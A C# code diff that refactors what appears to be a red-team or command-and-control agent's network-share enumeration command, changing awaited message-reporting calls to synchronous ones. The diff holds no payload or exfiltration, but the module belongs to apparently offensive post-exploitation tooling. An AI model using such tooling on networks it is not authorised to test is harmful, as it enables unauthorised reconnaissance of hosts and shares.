@@ -66,7 +66,7 @@ namespace Agent
                     }
                     else
                     {
-                        await messageManager.AddResponse(new TaskResponse
+                        messageManager.AddTaskResponse(new TaskResponse
                         {
                             completed = true,
                             user_output = "No hosts specified.",
@@ -83,7 +83,7 @@ namespace Agent
 
                 if (targets.Count() < 1)
                 {
-                    await messageManager.AddResponse(new TaskResponse
+                    messageManager.AddTaskResponse(new TaskResponse
                     {
                         completed = true,
                         user_output = "No hosts found.",
@@ -114,16 +114,16 @@ namespace Agent
                         sb.AppendLine(e.ToString());
                     }
                     sb.AppendLine();
-                    await messageManager.Write(sb.ToString(), job.task.id, false);
+                    messageManager.Write(sb.ToString(), job.task.id, false);
                 }
             }
             catch (Exception e)
             {
-                await messageManager.Write(e.ToString(), job.task.id, true, "error");
+                messageManager.Write(e.ToString(), job.task.id, true, "error");
                 return;
             }
 
-            await messageManager.Write("Finished executing.", job.task.id, true);
+            messageManager.Write("Finished executing.", job.task.id, true);
         }
         public SHARE_INFO_1[] EnumNetShares(string Server)
         {
